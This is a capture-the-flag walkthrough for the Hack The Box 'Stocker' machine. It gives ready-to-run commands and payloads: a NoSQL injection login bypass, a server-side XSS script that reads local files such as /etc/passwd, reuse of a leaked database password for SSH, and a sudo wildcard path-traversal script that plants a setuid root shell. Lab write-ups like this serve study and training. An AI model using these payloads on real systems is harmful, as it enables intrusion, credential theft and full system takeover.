## HTB: Stocker Walkthrough

### Recon

#### Nmap Scan
```bash
nmap -p- --min-rate 10000 10.10.11.196
nmap -p 22,80 -sCV 10.10.11.196
```
- Open Ports: 22 (SSH), 80 (HTTP)
- Hostname Redirects to: `stocker.htb`
- Added `stocker.htb` and `dev.stocker.htb` to `/etc/hosts`

#### Subdomain Discovery
```bash
ffuf -u http://10.10.11.196 -H "Host: FUZZ.stocker.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
```
- Found `dev.stocker.htb`

#### Web Enumeration
- `stocker.htb` is a static site
- `dev.stocker.htb` is an Express.js application with a login form

### Shell as angoose

#### NoSQL Injection Auth Bypass
```json
{"username": {"$ne": "0xdf"}, "password": {"$ne":"0xdf"}}
```
- Logs in successfully due to likely NoSQL-based auth.

#### PDF File Read via Server-Side XSS (SSXSS)
- Purchase items and manipulate `title` field in basket JSON.
- Injected JS payload:
```js
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```
- Retrieved `/etc/passwd` and `/var/www/dev/index.js`

#### Found MongoDB URI
```js
'mongodb://prod_user:IHeardPassphrasesArePrettySecure@localhost/prod?authSource=admin&w=1'
```
- Tried SSH with these creds: `ssh angoose@stocker.htb`

#### Gained access:
```bash
sshpass -p 'IHeardPassphrasesArePrettySecure' ssh angoose@stocker.htb
```

### Shell as root

#### Sudo Rights
```bash
sudo -l
(ALL) /usr/bin/node /usr/local/scripts/*.js
```
- Scripts are owned by root and unreadable, but wildcard allows path traversal

#### Exploiting Path Traversal in sudo
```javascript
// /dev/shm/0xdf.js
require('child_process').exec('cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 4777 /tmp/0xdf')
```
```bash
sudo node /usr/local/scripts/../../../dev/shm/0xdf.js
/tmp/0xdf -p
```

#### Gained Root Access
```bash
/tmp/0xdf -p
cat /root/root.txt
```

---

### Summary
- NoSQL Injection for initial login
- Server-Side XSS to read files from the host
- Exfiltrated DB credentials to access SSH
- Wildcard misconfiguration in sudo allows path traversal to arbitrary root shell

Rooted `Stocker` 🎉